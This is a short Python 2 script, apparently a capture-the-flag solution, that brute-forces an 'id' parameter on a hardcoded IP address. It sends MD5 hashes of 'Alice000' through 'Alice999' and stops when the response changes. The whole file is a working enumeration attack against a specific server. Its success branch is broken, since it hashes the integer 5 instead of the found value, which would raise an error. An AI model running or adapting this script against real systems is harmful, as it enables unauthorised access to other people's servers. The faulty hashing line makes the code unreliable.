import hashlib
import urllib2
from time import sleep

name = 'Alice'
url = 'http://218.2.197.237:8081/472644703485f950e3b746f2e3818f49/index.php'
res = ''
base = 'Who are you '

for i in range(0, 1000):
	print 'try ' + str(i).zfill(3)
	t = name + str(i).zfill(3)
	parment = '?id=' + hashlib.md5(t).hexdigest()
	data = urllib2.urlopen(url+parment)
	res = data.read()

	#sleep(0.5)

	if res[-13:-1] != base:
		print '[!]Found! ' + t + ' ' + hashlib.md5(5).hexdigest()
		exit(0)

